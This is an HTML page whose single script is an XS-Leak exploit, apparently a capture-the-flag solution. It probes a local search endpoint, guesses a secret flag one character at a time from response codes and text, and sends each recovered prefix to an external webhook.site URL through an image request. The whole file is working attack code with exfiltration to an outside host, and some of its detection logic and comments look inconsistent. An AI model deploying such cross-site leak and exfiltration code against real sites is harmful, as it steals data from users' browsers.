<!DOCTYPE html>
<html>
<body>
<script>
    const WEBHOOK = 'https://webhook.site/11e453b1-e116-4947-9501-3016aceedae5';
    const charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_{}-!';
    let flag = 'BOH25{';
    
    // XS-Leak: Detect response differences
    async function xsLeakCheck(query) {
        const res = await fetch('http://127.0.0.1:5000/search?q=' + encodeURIComponent(query), {
            redirect: 'manual'  // Don't follow redirects automatically
        });
        
        // XS-Leak Vector 1: Status code detection
        if (res.status === 200) {
            // Query is in flag!
            const text = await res.text();
            if (text.includes('hacker detected')) {
                return true;
            }
        }
        
        // XS-Leak Vector 2: Redirect detection
        if (res.status === 302 || res.redirected) {
            // Query is NOT in flag
            return false;
        }
        
        return false;
    }
    
    // Extract flag using XS-Leak
    async function extract() {
        while (!flag.endsWith('}')) {
            for (let c of charset) {
                const test = flag + c;
                
                // Use XS-Leak to detect if character is in flag
                if (await xsLeakCheck(test)) {
                    // Verify it's the next character
                    const verify = test + 'ZZZ_NOT_IN_FLAG';
                    if (!(await xsLeakCheck(verify))) {
                        flag += c;
                        // Send to webhook
                        (new Image()).src = WEBHOOK + '?flag=' + encodeURIComponent(flag);
                        break;
                    }
                }
            }
        }
    }
    
    extract();
</script>
</body>
</html>
